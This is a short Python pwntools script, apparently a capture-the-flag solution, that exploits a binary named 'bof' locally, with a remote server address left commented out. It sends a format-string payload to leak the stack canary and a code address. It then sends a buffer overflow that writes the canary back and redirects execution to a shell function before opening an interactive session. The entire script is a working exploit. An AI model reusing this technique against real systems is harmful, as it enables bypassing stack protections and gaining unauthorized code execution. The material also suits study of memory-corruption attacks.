from pwn import *

# %137$llx --> canary
# %139$llx --> <main+73>

elf = context.binary = ELF('./bof',checksec=False)
p = elf.process()
#p = remote('101.50.0.66', 9000)

pay = b"%137$p||%139$p"
p.sendlineafter(b": ", pay)
leak = [int(i, 16) for i in p.recvline().decode().strip().split("||")]
canary,main_73 = leak[0],leak[1]
print(list(map(hex, [canary,main_73])))

pay = b"\x00" * 1032
pay += p64(canary)
pay += p64(0) * 1
pay += p64(main_73 - 4860 + 0x11e9) # shell

p.sendlineafter(b": ", pay)
p.interactive()
